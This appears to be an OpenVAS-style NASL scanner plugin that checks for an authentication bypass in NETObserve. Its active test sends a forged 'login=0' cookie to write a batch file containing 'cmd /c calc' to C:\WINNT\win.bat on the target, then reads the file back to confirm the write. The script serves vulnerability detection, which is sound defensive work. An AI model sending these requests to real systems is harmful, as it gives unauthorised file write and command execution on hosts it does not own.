if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11971" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 9319 );
	script_tag( name: "cvss_base", value: "7.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:C/I:C/A:C" );
	script_name( "NETObserve Authentication Bypass vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2003 Noam Rathaus" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Disable this service." );
	script_tag( name: "summary", value: "NETObserve is a solution for monitoring an otherwise unattended computer.

  The product is considered as being highly insecure, as it allows the execution of arbitrary commands, editing
  and viewing of abitrary files, without any kind of authentication." );
	script_tag( name: "impact", value: "An attacker may use this software to gain the control on this system." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
host = http_host_name( port: port );
req = NASLString( "POST /sendeditfile HTTP/1.1\\r\\nAccept: */*\\r\\nReferer: http://", host, "/editfile=?C:\\\\WINNT\\\\win.bat?\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: ", host, "\\r\\nConnection: close\\r\\nContent-Length: 25\\r\\nCookie: login=0\\r\\n\\r\\nnewfiledata=cmd+%2Fc+calc" );
res = http_keepalive_send_recv( port: port, data: req );
if(!res){
	exit( 0 );
}
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "NETObserve" )){
	url = "/file/C%3A%5CWINNT%5Cwin.bat";
	req = NASLString( "GET ", url, " HTTP/1.1\\r\\nAccept: */*\\r\\nReferer: http://", host, "/getfile=?C:\\\\WINNT\\\\win.bat?\\r\\nHost: ", host, "\\r\\nConnection: close\\r\\nCookie: login=0\\r\\n\\r\\n" );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res){
		exit( 0 );
	}
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "cmd /c calc" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

